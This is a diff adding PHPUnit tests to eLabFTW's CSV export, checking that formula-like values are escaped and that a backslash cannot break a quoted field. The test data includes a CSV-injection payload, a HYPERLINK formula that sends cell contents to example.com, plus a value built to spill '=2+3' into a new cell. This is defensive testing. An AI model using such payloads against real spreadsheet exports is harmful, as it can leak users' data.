@@ -11,16 +11,23 @@ declare(strict_types=1);
 
 namespace Elabftw\Make;
 
+use Elabftw\Enums\Action;
 use Elabftw\Enums\ReportScopes;
 use Elabftw\Exceptions\ForbiddenException;
 use Elabftw\Exceptions\ImproperActionException;
 use Elabftw\Models\ProcurementRequests;
 use Elabftw\Models\StorageUnits;
+use Elabftw\Models\Tags;
 use Elabftw\Models\Teams;
 use Elabftw\Models\Users\Users;
 use Elabftw\Traits\TestsUtilsTrait;
+use League\Csv\Reader;
 use Symfony\Component\HttpFoundation\Response;
 
+use function array_combine;
+use function array_shift;
+use function count;
+use function iterator_to_array;
 use function str_ends_with;
 
 class MakeCsvTest extends \PHPUnit\Framework\TestCase
@@ -97,5 +104,50 @@ class MakeCsvTest extends \PHPUnit\Framework\TestCase
         $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::StoredCompounds));
         $this->assertInstanceOf(Response::class, $Handler->getResponse(ReportScopes::Team));
 
+    }
+
+    public function testFormulasAreEscaped(): void
+    {
+        $Entity = $this->getFreshExperiment();
+        $title = '=HYPERLINK("https://example.com/?leak="&A1,"click")';
+        $Entity->patch(Action::Update, array('title' => $title, 'body' => '<p>+1+1</p>'));
+        $Tags = new Tags($Entity);
+        $Tags->postAction(Action::Create, array('tag' => '@SUM(1,1)'));
+        $Entity->readOne();
+
+        $row = $this->parseCsv(new MakeCsv(array($Entity)))[0];
+        $this->assertSame("'" . $title, $row['title']);
+        $this->assertSame("'+1+1", $row['body']);
+        $this->assertSame("'@SUM(1,1)", $row['tags']);
+    }
+
+    public function testBackslashCannotEndEnclosure(): void
+    {
+        // with a backslash as escape character, \" is written without doubling the quote, so a spreadsheet
+        // application would end the field there, and the rest of the value would land in a new cell: =2+3
+        $Entity = $this->getFreshExperiment();
+        $title = 'x\\",=2+3,\\"y';
+        $Entity->patch(Action::Update, array('title' => $title));
+
+        $row = $this->parseCsv(new MakeCsv(array($Entity)))[0];
+        $this->assertSame($title, $row['title']);
+    }
+
+    /**
+     * Parse the CSV the way a spreadsheet application does (RFC 4180: no escape character)
+     */
+    private function parseCsv(AbstractMakeCsv $Make): array
+    {
+        $Reader = Reader::fromString($Make->getFileContent());
+        $Reader->setEscape('');
+        $records = iterator_to_array($Reader->getRecords(), false);
+        $header = array_shift($records) ?? array();
+        $rows = array();
+        foreach ($records as $record) {
+            // a value spilling into other cells would shift the columns
+            $this->assertCount(count($header), $record);
+            $rows[] = array_combine($header, $record);
+        }
+        return $rows;
     }
 }
